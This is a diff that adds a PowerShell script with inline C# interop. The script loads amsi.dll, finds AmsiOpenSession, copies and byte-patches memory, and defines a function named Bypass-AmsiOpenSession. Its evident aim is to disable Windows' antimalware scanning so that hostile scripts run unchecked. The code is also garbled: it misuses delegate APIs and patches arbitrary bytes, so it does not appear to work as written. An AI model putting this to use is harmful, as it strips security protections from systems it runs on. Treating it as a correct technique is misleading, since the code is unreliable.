@@ -1,0 +1,36 @@
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class Win32API
+{
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr LoadLibrary(string lpFileName);
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+}
+"@
+
+$amsi = [Win32API]::LoadLibrary("amsi.dll")
+$addr = [Win32API]::GetProcAddress($amsi, "AmsiOpenSession")
+$buf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($addr, [Type]"System.IntPtr")
+$sc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($addr, [Type]"System.IntPtr").GetInvocationList() | Select-Object -First 1
+$delegateType = $sc.GetType()
+$methodInfo = $delegateType.GetMethod("Invoke")
+$delegateParams = $methodInfo.GetParameters()
+$delegateReturnType = $methodInfo.ReturnType
+$buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(256)
+[System.Runtime.InteropServices.Marshal]::Copy($sc.Method.GetMethodBody().GetILAsByteArray(), 0, $buffer, 256)
+for ($i = 0; $i -lt 256; $i++)
+{
+    if ([System.Runtime.InteropServices.Marshal]::ReadByte($buffer, $i) -eq 0x73)
+    {
+        [System.Runtime.InteropServices.Marshal]::WriteByte($buffer, $i, 0x72)
+    }
+}
+$newaddr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($buffer, $delegateType)
+
+
+function Bypass-AmsiOpenSession {
+    param()
+    $newaddr.Invoke()
+}
